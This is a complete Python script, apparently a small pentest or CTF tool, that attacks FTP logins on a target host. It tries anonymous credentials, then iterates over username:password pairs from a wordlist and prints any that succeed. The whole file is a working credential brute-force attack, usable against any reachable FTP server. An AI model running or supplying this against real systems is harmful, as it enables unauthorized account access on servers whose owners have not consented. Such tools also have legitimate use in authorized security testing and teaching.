#!/bin/python3
'''
This program automatize ftp bruteforce login attempt
@authors ybeattie inspired by arjnklc
'''

import argparse
import sys
from ftplib import FTP, all_errors

def parse():
    '''This function tests the FTP authentication'''
    parser = argparse.ArgumentParser(
        prog="FTP bruteforce",
        description="A few authentication attempt are made (anonymous and base on wordlist)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-w", "--wordlist")
    return parser.parse_args()

def ftp_login(target, username, password):
    '''Function performing a ftp login'''
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print("\n[!] Credentials have found.")
        print(f"\n[!] Username : {format(username)}")
        print(f"\n[!] Password : {format(password)}")
        sys.exit(0)
    except all_errors:
        pass


def brute_force(target, wordlist):
    '''Performing bruteforce for ftp with wordlist'''
    try:
        with open(wordlist, "r", encoding='utf-8') as f:
            words = f.readlines()
            for word in words:
                word = word.strip()
                ftp_login(target, word.split(':')[0], word.split(':')[1])

    except FileNotFoundError:
        print("\n[-] There is no such wordlist file. \n")
        sys.exit(0)

def main():
    '''Main function testing anonymous ftp login before performing bruteforce'''
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-w", "--wordlist")

    args = parser.parse_args()
    print("Testing anonymous login")
    target = args.target
    ftp_login(target, "anonymous", "anonymous")

    if args.wordlist:
        wordlist = args.wordlist
        brute_force(target, wordlist)
        print("\n[-] Brute force finished. \n")
    else :
        print("No file was provided for bruteforce")

if __name__=='__main__':
    main()
